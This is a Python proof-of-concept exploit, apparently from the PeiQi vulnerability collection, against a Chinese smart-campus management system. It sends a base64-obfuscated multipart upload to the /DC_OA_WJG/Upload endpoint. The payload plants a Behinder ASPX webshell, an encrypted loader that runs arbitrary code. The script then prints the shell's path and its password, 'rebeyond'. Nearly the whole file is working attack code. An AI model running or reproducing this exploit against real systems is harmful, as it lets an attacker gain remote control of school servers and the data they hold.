import requests
import sys
import random
import re
import base64
import time
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC_Des: http://wiki.peiqi.tech                                   \033[0m')
    print('+  \033[34mGithub : https://github.com/PeiQi0                                 \033[0m')
    print('+  \033[34m公众号  : PeiQi文库                                                   \033[0m')
    print('+  \033[34mVersion: 智慧校园管理系统                                            \033[0m')
    print('+  \033[36m使用格式:  python3 poc.py                                            \033[0m')
    print('+  \033[36mUrl         >>> http://xxx.xxx.xxx.xxx                             \033[0m')
    print('+------------------------------------------')

def POC_1(target_url):
    vuln_url = target_url + "/DC_OA_WJG/Upload"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryNxqOHxbHqt9mf7s5",
    }
    data = base64.b64decode("LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5TnhxT0h4YkhxdDltZjdzNQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InVwRmlsZSI7IGZpbGVuYW1lPSJQZWlRaS5hc3B4IgpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQoKPCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiAlPjwlQEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5SZWZsZWN0aW9uIiU+PCVTZXNzaW9uLkFkZCgiayIsImU0NWUzMjlmZWI1ZDkyNWIiKTtieXRlW10gayA9IEVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoU2Vzc2lvblswXSArICIiKSxjID0gUmVxdWVzdC5CaW5hcnlSZWFkKFJlcXVlc3QuQ29udGVudExlbmd0aCk7QXNzZW1ibHkuTG9hZChuZXcgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeS5SaWpuZGFlbE1hbmFnZWQoKS5DcmVhdGVEZWNyeXB0b3IoaywgaykuVHJhbnNmb3JtRmluYWxCbG9jayhjLCAwLCBjLkxlbmd0aCkpLkNyZWF0ZUluc3RhbmNlKCJVIikuRXF1YWxzKHRoaXMpOyU+CgotLS0tLS1XZWJLaXRGb3JtQm91bmRhcnlOeHFPSHhiSHF0OW1mN3M1LS0K")
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5)
        print("\033[36m[o] 正在请求 {}/DC_OA_WJG/Upload 尝试上传木马..... \033[0m".format(target_url))
        if 'true' in response.text and 'path' in response.text and response.status_code == 200:
            print("\033[32m[o] 目标 {} 成功上传 Webshell文件\033[0m".format(target_url))
            webshell_path = re.findall(r'"path":"(.*?)"', response.text)[0][2:]
            print("\033[32m[o] Webshell文件地址: {}{} \033[0m".format(target_url, webshell_path))
            print("\033[32m[o] 使用冰蝎连接 密码: rebeyond\033[0m".format(target_url))

        else:
            print("\033[31m[x] 目标 {} 上传Webshell文件失败\033[0m".format(target_url))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[x] 请求失败 \033[0m", e)


if __name__ == '__main__':
    title()
    target_url = str(input("\033[35mPlease input Attack Url\nUrl >>> \033[0m"))
    POC_1(target_url)